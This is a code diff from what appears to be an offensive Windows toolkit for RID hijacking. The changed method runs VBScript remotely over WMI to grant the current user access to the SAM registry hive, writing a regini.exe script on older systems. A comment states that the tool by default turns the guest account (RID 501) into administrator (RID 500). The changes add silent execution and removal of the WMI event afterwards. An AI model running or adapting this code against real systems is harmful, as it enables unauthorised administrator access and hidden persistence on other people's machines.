@@ -47,39 +47,47 @@ class RID_Hijack_Toolkit():
                     break
         iWbemServices.RemRelease()
 
-    def Permissions_Controller(self, action, user):
+    def Permissions_Controller(self, action, user, currentUsers):
         exec_command = EXEC_COMMAND(self.iWbemLevel1Login, codec="gbk")
-        regini_Attr =[
-            r'HKEY_LOCAL_MACHINE\SAM [1 17]',
-            r'HKEY_LOCAL_MACHINE\SAM\SAM [1 17]',
-            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]',
-            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]',
-            r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]',
-            r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(user)), 16), '08x'))
-        ]
+        executer_vbs = executeVBS_Toolkit(self.iWbemLevel1Login)
 
-        if "retrieve" in action:
-            for i in range(1, len(regini_Attr)): regini_Attr[i] = regini_Attr[i].replace('[1 17]','[17]')
-
-        print("[+] Grant / Restrict user permissions to registry key via regini.exe")
-        
         # For old system, if command too long with cause error in Win32_ScheduledJob create method
         # so we need to write batch file on target then execute it.
         if "old" in action:
+            regini_Attr =[
+                r'HKEY_LOCAL_MACHINE\SAM [1 17]',
+                r'HKEY_LOCAL_MACHINE\SAM\SAM [1 17]',
+                r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]',
+                r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]',
+                r'HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]',
+                r"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\%s [1 17]"%str(format(int(hex(int(user)), 16), '08x'))
+            ]
+
+            # No more retrieve options :)
+            #if "retrieve" in action:
+            #    for i in range(1, len(regini_Attr)): regini_Attr[i] = regini_Attr[i].replace('[1 17]','[17]')
+            
+            print("[+] Grant / Restrict user permissions to registry key via regini.exe")
+
             ini_Content = ""
             for i in regini_Attr: ini_Content += i + "\r\n"
             ini_FileName = "windows-object-%s.ini"%str(uuid.uuid4())
             with open('./lib/vbscripts/Exec-Command-Silent-UnderNT6-II.vbs') as f: vbs = f.read()
             vbs = vbs.replace("REPLACE_WITH_DEST", r'C:\windows\temp\%s'%ini_FileName).replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode('utf-8')).decode('utf-8')).replace("REPLACE_WITH_COMMAND", r'regini.exe C:\windows\temp\%s'%ini_FileName)
-            executer = executeVBS_Toolkit(self.iWbemLevel1Login)
-            tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
+            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
             exec_command.timer_For_UnderNT6()
-            executer.remove_Event(tag)
+            executer_vbs.remove_Event(tag)
         else:
-            cmd = ""
-            for i in regini_Attr: cmd += r'echo %s >> C:\windows\temp\windows.ini && '%i
-            cmd += r"regini.exe C:\windows\temp\windows.ini"
-            exec_command.exec_command_silent(command=cmd)
+            print("[+] Grant / Restrict user permissions to registry key via vbscript")
+            with open('./lib/vbscripts/GrantSamAccessPermission.vbs') as f: vbs = f.read()
+            vbs = vbs.replace("REPLACE_WITH_USER", currentUsers)
+            tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
+            
+            for i in range(5,0,-1):
+                print(f"[+] Waiting {i}s for next step.", end="\r", flush=True)
+                time.sleep(1)
+            
+            executer_vbs.remove_Event(tag)
 
     # Default is hijacking guest(RID=501) users to administrator(RID=500)
     def hijack(self, action, user, hijack_RID=None, hostname=None):
